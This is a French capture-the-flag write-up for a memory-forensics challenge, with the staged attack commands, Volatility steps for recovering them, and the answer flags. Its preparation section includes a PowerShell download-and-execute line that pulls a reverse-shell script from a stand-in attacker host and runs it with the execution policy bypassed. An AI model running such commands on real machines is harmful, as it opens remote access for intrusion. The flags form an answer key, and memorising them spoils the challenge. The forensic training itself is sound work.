# Piraterie
## Challenge
### Épisode 1
Vous venez d'être embauché en tant qu'analyse sécurité dans votre nouvelle entreprise. Encore ému par cette nouvelle, on vous affecte à votre première mission.   
Votre client du jour s'est fait piraté. Heureusement, il a eut la présence d'esprit de ne pas éteindre la machine compromise et vous fournit un dump mémoire.  
Essayez de trouver ce qu'a pu faire le pirate.

### Épisode 2
Il semble que le pirate ait réussi à récupérer des informations confidentielles qui étaient visibles sur le bureau.  
Validez cette hypothèse et retrouvez cette information.

### Épisode 3
Sachant ce qui a été dérobé, il faut maintenant retrouver le malfrat.  
Retracez son parcours et retrouvez l'IP ainsi que le port de connexion qu'il a utilisé pendant son attaque.  
  
Le flag est de la forme PHACK{<INFO>} avec <INFO> le résultat de \<IP>:\<PORT> encodé en base 64.


## Préparation
```bash
ping my-none-ethical-hacking-server.thief.org
cd "C:\Users\Public\Documents\hidden"
IEX (New-Object Net.WebClient).DownloadString(\"http://my-none-ethical-hacking-server.thief.org/reverse-shell.ps1\")
powershell -ep Bypass -file ".\reverse-shell.ps1"

whoami
pwd
dir
cd ..
cd Desktop
dir
echo "Got U fucker !!!!" > .Pwned
echo "PHACK{STEP_1-IC4nD0Wh4TuD0}" >> .Pwned
rm .Pwned
systeminfo
echo "PHackCTF Rocks!"
```

+ Ouvrir plein de fenêtres Firefox & IE
+ Ouvrir l'image de fond d'écran

## Fichier
Lien : https://bit.ly/2O3ZvaJ

## Résolution
### Retrouver le profile de la machine
```python
python /opt/volatility/vol.py -f dump.raw imageinfo
```

### Récupérer la liste des commandes
```python
python /opt/volatility/vol.py -f dump.raw --profile=Win7SP1x86_23418 cmdscan
```

### Récupérer le fichier de fond d'écran
```python
python /opt/volatility/vol.py -f dump.raw --profile=Win7SP1x86_23418 filescan | grep TranscodedWallpaper.jpg```
python /opt/volatility/vol.py -f dump.raw --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000007e50a038 -D /tmp/vol
```

### Récupérer les infos de connexion
```python
python /opt/volatility/vol.py -f dump.raw --profile=Win7SP1x86_23418 netscan
```

## Flags
### Épisode 1
```
PHACK{STEP_1-IC4nD0Wh4TuD0}
```

### Épisode 2
```
PHACK{STEP_2-IC4nCwH4TUC}
```

### Épisode 3
```
PHACK{MTg1LjEzLjM3Ljk5OjEzMzc=}
```
